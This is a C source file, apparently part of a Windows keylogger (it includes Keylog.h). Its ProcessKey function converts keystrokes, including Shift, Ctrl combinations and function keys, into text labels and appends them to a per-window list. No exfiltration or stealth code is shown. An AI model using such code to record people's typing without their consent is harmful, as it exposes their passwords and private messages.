//* Running in the Main Thread.

#include "..\..\..\Include\Keylog.h"

#define CTRL_A			1
#define CTRL_Z			26
#define KEYBOARD_STATE	256

BOOL ProcessKey(BOOL Type, HWND hWnd, WPARAM wParam, LPARAM lParam) {
    BYTE KeyBoardState[KEYBOARD_STATE];
    BOOL fRetVal = FALSE;
    BOOL FuncRetVal = FALSE;
    UINT ScanCode = 0;

    static WCHAR PrevKey[MAX_KEY_NAME] = { 0 };

    WCHAR TempBuffer[MAX_KEY_NAME] = { 0 };
    WCHAR TempBufferCopy[4] = { 0 };

    WCHAR CtrlChar[MAX_KEY_NAME] = L" [CTRL+";
    WCHAR CtrlEnd[2] = L"]";

    unsigned char TempC = (char)wParam;
    int iRetVal = 0;

    switch (wParam) {
        //WM_KEYUP

        case VK_HOME:
            wcscpy_s(TempBuffer, MAX_KEY_NAME, L" [HOME]");
            break;

        case VK_END:
            wcscpy_s(TempBuffer, MAX_KEY_NAME, L" [END]");
            break;

        case VK_ESCAPE:
            wcscpy_s(TempBuffer, MAX_KEY_NAME, L" [ESC]");
            break;

        case VK_CANCEL:
            wcscpy_s(TempBuffer, MAX_KEY_NAME, L" [CANCEL]");
            break;

        case VK_LWIN:
        case VK_RWIN:
            wcscpy_s(TempBuffer, MAX_KEY_NAME, L" [WINDOWS]");
            break;

        case VK_APPS:
            wcscpy_s(TempBuffer, MAX_KEY_NAME, L" [WIN-APP]");
            break;


        case  VK_SHIFT:
        {
            if (Type == UP)
                wcscpy_s(TempBuffer, MAX_KEY_NAME, L" [SHIFT-UP]");
            //End of WM_KEYUP
            else {
                if (!(wcscmp(PrevKey, L" [SHIFT-DN]")))
                    return TRUE;
                wcscpy_s(TempBuffer, MAX_KEY_NAME, L" [SHIFT-DN]");
            }
            break;
        }


        case VK_PRIOR:
            wcscpy_s(TempBuffer, MAX_KEY_NAME, L" [PGUP]");
            break;

        case VK_NEXT:
            wcscpy_s(TempBuffer, MAX_KEY_NAME, L" [PGDOWN]");
            break;

        case VK_LEFT:
            wcscpy_s(TempBuffer, MAX_KEY_NAME, L" [L-ARROW]");
            break;

        case VK_UP:
            wcscpy_s(TempBuffer, MAX_KEY_NAME, L" [U-ARROW]");
            break;

        case VK_RIGHT:
            wcscpy_s(TempBuffer, MAX_KEY_NAME, L" [R-ARROW]");
            break;

        case VK_DOWN:
            wcscpy_s(TempBuffer, MAX_KEY_NAME, L" [D-ARROW]");
            break;

        case VK_INSERT:
            wcscpy_s(TempBuffer, MAX_KEY_NAME, L" [INS]");
            break;

        case VK_DELETE:
            wcscpy_s(TempBuffer, MAX_KEY_NAME, L" [DEL]");
            break;

        case VK_BACK:
            wcscpy_s(TempBuffer, MAX_KEY_NAME, L" [BS]");
            break;

        case VK_TAB:
            wcscpy_s(TempBuffer, MAX_KEY_NAME, L" [TAB]");
            break;

        case VK_SPACE:
            wcscpy_s(TempBuffer, MAX_KEY_NAME, L" [SPACE]");
            break;

        case VK_RETURN:
            wcscpy_s(TempBuffer, MAX_KEY_NAME, L" [ENTER]");
            break;


        case VK_F1:
            wcscpy_s(TempBuffer, MAX_KEY_NAME, L" [F1]");
            break;

        case VK_F2:
            wcscpy_s(TempBuffer, MAX_KEY_NAME, L" [F2]");
            break;

        case VK_F3:
            wcscpy_s(TempBuffer, MAX_KEY_NAME, L" [F3]");
            break;

        case VK_F4:
            wcscpy_s(TempBuffer, MAX_KEY_NAME, L" [F4]");
            break;

        case VK_F5:
            wcscpy_s(TempBuffer, MAX_KEY_NAME, L" [F5]");
            break;

        case VK_F6:
            wcscpy_s(TempBuffer, MAX_KEY_NAME, L" [F6]");
            break;

        case VK_F7:
            wcscpy_s(TempBuffer, MAX_KEY_NAME, L" [F7]");
            break;

        case VK_F8:
            wcscpy_s(TempBuffer, MAX_KEY_NAME, L" [F8]");
            break;

        case VK_F9:
            wcscpy_s(TempBuffer, MAX_KEY_NAME, L" [F9]");
            break;

        case VK_F10:
            wcscpy_s(TempBuffer, MAX_KEY_NAME, L" [F10]");
            break;

        case VK_F11:
            wcscpy_s(TempBuffer, MAX_KEY_NAME, L" [F11]");
            break;

        case VK_F12:
            wcscpy_s(TempBuffer, MAX_KEY_NAME, L" [F12]");
            break;

        default:
        {
            fRetVal = GetKeyboardState(KeyBoardState);
            ScanCode = lParam & 0X00FF0000;

            iRetVal = wsprintf(TempBufferCopy, L"%c", TempC);
            iRetVal = ToUnicode(wParam, ScanCode, KeyBoardState, TempBuffer, sizeof(TempBuffer) / 2, 0);

            if (TempBuffer[0] == 0 || (TempBuffer[0] >= 27 && TempBuffer[0] <= 31))
                break;	//Unwanted Ctrl characters

            if (TempBuffer[0] >= CTRL_A && TempBuffer[0] <= CTRL_Z)	//Ctrl+A - Ctrl+Z
            {
                wcscat_s(CtrlChar, MAX_KEY_NAME, TempBufferCopy);
                wcscat_s(CtrlChar, MAX_KEY_NAME, CtrlEnd);
                wcscpy_s(TempBuffer, MAX_KEY_NAME, CtrlChar);
                break;
            }

            break;
        }
    }// End of switch

    wcscpy_s(PrevKey, MAX_KEY_NAME, TempBuffer);
    FuncRetVal = BuildTempLinkList(hWnd, TempBuffer);
    if (FuncRetVal == FALSE)
        return FALSE;

    return TRUE;
}
